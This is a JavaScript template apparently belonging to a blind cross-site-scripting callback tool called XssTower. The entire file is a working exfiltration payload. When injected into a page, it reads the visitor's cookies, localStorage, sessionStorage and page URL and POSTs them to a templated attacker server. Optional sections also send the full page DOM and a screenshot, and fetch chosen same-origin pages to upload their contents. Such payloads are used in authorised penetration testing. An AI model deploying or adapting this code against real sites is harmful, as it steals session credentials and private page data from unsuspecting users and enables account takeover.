var correlation_key = "{{ .CorrelationKey }}";
var url = "{{ .ServerUrl }}";

e = {
    "cookies": document.cookie,
    "local": JSON.stringify((typeof localStorage !== 'undefined') ? localStorage : {}),
    "session": JSON.stringify((typeof sessionStorage !== 'undefined') ? sessionStorage : {}),
    "key": correlation_key,
    "url":window.location.href
}
if(e["local"]=="null"){e["local"]="{}"}
if(e["session"]=="null"){e["session"]="{}"}

var t=new XMLHttpRequest;
t.open("POST",url+"{{ .Callback }}");
t.setRequestHeader("Content-type","application/json");
t.send(JSON.stringify(e));

{{ if .Dom }}
e = {
    "dom": btoa(document.documentElement.innerHTML),
    "key": correlation_key,

}

var t=new XMLHttpRequest;
t.open("POST",url+"{{ .Callback }}",);
t.setRequestHeader("Content-type","application/json");
t.send(JSON.stringify(e));
{{ end }}


{{ if .Screenshot }}
{{ "html2canvas.min.js" | include | unescapeHTML }}
html2canvas(document.body).then(function(canvas) {
    e = {
        "screenshot": canvas.toDataURL(),
        "key": correlation_key,
    
    }
    
    var t=new XMLHttpRequest;
    t.open("POST",url+"{{ .Callback }}",);
    t.setRequestHeader("Content-type","application/json");
    t.send(JSON.stringify(e));
});
{{ end }}
{{ if .CollectPages  }}
function collect_page(page){
    x=new XMLHttpRequest;
    x.onload=function(){
        var x2 = new XMLHttpRequest();
        x2.open("PUT", url+"{{ .Callback }}");
        x2.setRequestHeader("XssTower-File", page)
        x2.setRequestHeader("XssTower-Key", correlation_key)
        
        x2.send(this.response)
    };
    x.open("GET",page);x.send();
}

{{ .CollectPages | unescapeHTML }}.forEach(element => collect_page(element));
{{ end }}

var img = document.createElement("img");
img.src = url+"?sleep=1";
document.appendChild(img);
